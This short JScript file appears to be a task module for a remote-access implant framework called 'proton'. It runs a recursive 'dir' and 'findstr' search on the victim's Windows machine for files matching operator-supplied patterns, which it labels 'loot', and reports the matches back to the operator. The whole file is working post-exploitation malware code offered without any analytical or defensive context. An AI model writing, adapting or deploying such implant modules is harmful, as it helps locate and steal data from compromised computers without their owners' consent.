try
{
    var tmpfile = "~DIRECTORY~\\" + proton.uuid() + ".txt";
    var loot = proton.shell.exec("dir ~LOOTD~ /s /b | findstr /I \"~LOOTE~ ~LOOTF~\"", tmpfile);
    proton.work.report(loot);
}
catch (e)
{
    proton.work.error(e)
}

proton.exit();
